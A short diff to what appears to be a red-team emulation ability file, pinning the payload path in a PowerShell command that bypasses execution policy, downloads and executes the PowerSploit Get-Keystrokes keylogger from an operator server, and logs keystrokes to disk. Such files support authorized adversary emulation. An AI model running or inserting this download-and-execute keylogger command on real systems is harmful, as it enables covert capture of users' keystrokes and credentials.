@@ -11,7 +11,7 @@ platforms:
   windows:
     pwsh:
       command: |
-        powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('#{operator.payloads}/PowerSploit/Get-Keystrokes.ps1'); Get-Keystrokes -LogPath C:\key.log -Timeout 60"
+        powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('#{operator.payloads}/57a30eb49e1a1d5f6adeccdb5f0e6e1c6f382b1a/Get-Keystrokes.ps1'); Get-Keystrokes -LogPath C:\key.log -Timeout 60"
 metadata:
   authors:
   - bfuzzy1
